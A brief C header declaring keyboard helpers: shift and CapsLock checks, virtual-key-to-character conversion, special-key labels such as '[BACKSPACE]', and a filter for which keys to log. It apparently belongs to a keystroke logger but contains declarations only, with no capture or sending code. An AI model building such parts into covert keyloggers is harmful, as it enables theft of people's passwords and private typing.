#pragma once

// Check if Shift key is currently pressed
bool IsShiftPressed();

// Check if CapsLock is currently ON
bool IsCapsLockOn();

// Convert Virtual Key code to ASCII character
// Returns the character, or 0 if not a printable character
char VKToAscii(int vkCode, bool shift, bool caps);

// Get special key name as a string (e.g., "[BACKSPACE]", "[F1]")
// Returns NULL if not a special key
const char* GetSpecialKeyName(int vkCode);

// Check if a VK code should be logged (filters out modifier keys)
bool ShouldLogKey(int vkCode);
